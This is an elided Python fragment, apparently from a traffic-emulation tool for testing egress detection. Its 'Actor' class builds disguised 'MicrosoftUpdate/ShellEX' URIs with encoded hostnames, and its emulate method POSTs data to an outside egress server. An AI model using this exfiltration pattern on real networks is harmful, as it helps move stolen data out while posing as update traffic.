...
class Actor:
    ...
    def __init__(self, cli_object):
        ...
        self.encoded_hostnames = ['SG9tZVBD', 'Q29tcGFueVdvcmtzdGF0aW9u',
        ...
        self.uris = [
            ...
            '/MicrosoftUpdate/ShellEX/KB' + self.gen_numbers(num=7) + '/default.aspx?tmp=' + random.choice(self.encoded_hostnames)]
    ...
    def emulate(self, data_to_exfil=None):
        ...
        for times_requested in xrange(1, 6):
            ...
            post_req = urllib2.Request(
                "http://" + self.egress_server + post_uri, posted_data, headers=putter_headers)
